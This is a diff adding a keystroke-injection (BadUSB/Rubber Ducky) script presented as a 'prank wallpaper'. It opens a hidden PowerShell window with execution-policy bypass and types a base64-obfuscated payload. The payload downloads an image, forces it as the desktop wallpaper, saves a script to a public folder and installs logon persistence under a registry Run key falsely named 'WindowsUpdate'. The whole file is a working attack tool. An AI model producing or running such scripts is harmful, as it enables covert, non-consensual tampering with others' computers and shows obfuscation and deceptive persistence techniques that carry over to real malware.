@@ -1,0 +1,21 @@
+REM Prank wallpaper — chunk+run with startup persistence
+REM url: https://i.imgur.com/6hfXmtp.png
+REM persist key: WindowsUpdate | ps1: C:\Users\Public\wp.ps1
+DELAY 2000
+GUI r
+DELAY 800
+STRING powershell -ep bypass -w hidden
+ENTER
+DELAY 1000
+STRING $d = ""
+ENTER
+STRING $d += "JGY9J0M6XFVzZXJzXFB1YmxpY1xwLmpwZycKKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL2kuaW1ndXIuY29tLzZoZlhtdHAucG5nJywkZikKJHE9W2NoYXJdMzQKQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gKCdbRGxs"
+ENTER
+STRING $d += "SW1wb3J0KCcrJHErJ3VzZXIzMi5kbGwnKyRxKycpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBTeXN0ZW1QYXJhbWV0ZXJzSW5mbyhpbnQgYSxpbnQgYixzdHJpbmcgYyxpbnQgZCk7JykgLU5hbWUgVyAtTmFtZXNwYWNlIE4KU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0"
+ENTER
+STRING $d += "aCAnSEtDVTpcQ29udHJvbCBQYW5lbFxEZXNrdG9wJyAtTmFtZSBXYWxscGFwZXJTdHlsZSAtVmFsdWUgMgpTZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxDb250cm9sIFBhbmVsXERlc2t0b3AnIC1OYW1lIFRpbGVXYWxscGFwZXIgLVZhbHVlIDAKW04uV106"
+ENTER
+STRING $d += "OlN5c3RlbVBhcmFtZXRlcnNJbmZvKDIwLDAsJGYsMykK"
+ENTER
+STRING $b = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d)); $f = 'C:\Users\Public\wp.ps1'; [IO.File]::WriteAllText($f, $b); Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value ('powershell -ep bypass -w hidden -f ' + $f); & $f
+ENTER
